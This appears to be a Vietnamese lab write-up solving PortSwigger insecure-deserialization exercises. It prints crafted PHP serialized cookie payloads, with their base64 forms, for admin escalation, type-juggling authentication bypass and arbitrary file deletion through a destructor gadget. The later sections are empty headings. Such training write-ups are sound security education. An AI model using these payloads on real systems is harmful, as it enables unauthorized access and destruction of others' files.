# Lab insecure deserialization on Portswigger

### 1. Modifying object attributes

Trong trang web này sử dụng một đối tượng được serialized làm giá trị của cookie, sau đó sử dụng giá trị của một trường để xác thực quyền truy cập vào một số tà nguyên và chức năng giới hạn.

Sau khi đăng nhập, ta nhận được giá trị của cookie. Đem đi decode URL và base64

![image](https://user-images.githubusercontent.com/83699106/133071314-429ab3ba-7dcd-4564-a5ab-5773245da793.png)

Sau khi giải mã ta được giá trị

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
Ta quan sát thấy đối tượng này có tên là __User__ và có 2 thuộc tính là __username__ và __admin__

Thay đổi giá trị của __admin__ thành 1 và encode base64 ta được 1 giá trị token mới:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=

```
Thay thế nó vào giá trị token hiện tại và load lại trang.

![image](https://user-images.githubusercontent.com/83699106/133072048-6872f9a3-3d31-42c7-b1a4-15cf2e7bc4ec.png)

Trang admin hiện ra, xóa tk carlos để hoàn thành.


### 2. Modifying data types

Cách hoạt động của trang web này tương tự như trang web trên, sẽ sử dụng giá trị của một trường acccess_token để kiểm tra.

Sau khi giải mã cookie bằng URL và base64

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"nj3rb4d0wq8vgndzx2lr39dhvc0ij8qk";}

```

Trong PHP, toán tử `==` chỉ so sánh giá trị của 2 tham số mà bỏ qua kiểu dữ liệu. Vì vậy nếu so sánh 1 số với một chuỗi thì nó sẽ cống gắng ép kiểu từ string sang số
Trong trường hợp này, ta thấy mã token là `nj3rb4d0wq8vgndzx2lr39dhvc0ij8qk` bắt đầu bằng một chữ, khi ép kiểu sang số sẽ có giá trị bằng 0

Do đó ta sẽ thay đổi giá trị của trường `access_token` thành 0 và thay đổi các thành phần khác liên quan.

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
```
Sau đó encode bằng base64

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==
```
Thay thế giá trị cookie hiện tại và trang quản trị se hiện ra.

![image](https://user-images.githubusercontent.com/83699106/133073562-f809f7ae-c963-4e26-a5a5-9446261face7.png)



### 3. Using application functionality

Khi đăng nhập, trang web có một chức năng xóa tài khoản.

![image](https://user-images.githubusercontent.com/83699106/133101738-b655e5e9-9930-4176-b348-bcb775e3caf2.png)


Giải mã cookie, giá trị của cookie là một đối tượng có chứa 1 thuộc tính là __avatar_link__ chứa một đường dẫn tới ảnh đại diện của người dùng.

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"qm9b81y3wen83rfm2n1zo915z5j90fc4";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

Khi xóa tài khoản, server sẽ xóa avatar của người dùng thông qua đường dẫn này. Do đó, ta sẽ lợi dùng điều này để thay đường dẫn tới file __morale.txt__ của carlos, thay đổi độ dài của giá trị.

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"qm9b81y3wen83rfm2n1zo915z5j90fc4";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

```
Encode lại và thay thế cookie hiện tại, sau đó sử dụng chức năng __delete account__ .

Thay vì xóa avatar của người dùng hiện tại thì phía máy chủ sẽ xóa file theo đường dẫn mà chúng ta đã cung cấp.



### 4. Arbitrary object injection in PHP

Khi xem source code của trang, ta nhận thấy DEV đã để lại một comment trong source code chưa đường dẫn tới thư viện >

![image](https://user-images.githubusercontent.com/83699106/133102641-7f7201d1-236f-4d3e-b477-21ad17b6730c.png)

Truy cập theo đường dẫn tới trang, thêm __~__ vào url để có thể xem source code của trang.

```
https://acef1ffe1f74e7c680251a9c006c0088.web-security-academy.net/libs/CustomTemplate.php~
```

![image](https://user-images.githubusercontent.com/83699106/133103627-1f70f64d-4ac5-4312-9ca4-dafa572151c7.png)

Trong source code có 2 magic method là ____destruct()__ và ____construct()__ .

Khi khởi tạo một đối tượng, nó sẽ gọi tới hàm __construct()__ vad __destruct()__. 
Trong hàm __destruct()__ gọi tới hàm __unlink()__ lấy một thuộc tính __lock_file_path__ làm đầu vào.

![image](https://user-images.githubusercontent.com/83699106/133103368-d63a5d68-fd2f-4ada-b462-7f951e6e4aa3.png)

Ta sẽ lợi dụng các magic method này để tạo một đối tượng __Customtemplate__ và giá trị của thuộc tính được truyền vào hàm __unlink()__ sẽ là file mà ta muốn xóa.

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Thay thế giá trị cookie hiện tại

![Uploading image.png…]()




### 5. Exploiting Java deserialization with Apache Commons



### 6. Exploiting PHP deserialization with a pre-built gadget chain

### 7. Exploiting Ruby deserialization using a documented gadget chain

### 8. Developing a custom gadget chain for Java deserialization

### 9. Developing a custom gadget chain for PHP deserialization

### 10. Using PHAR deserialization to deploy a custom gadget chain


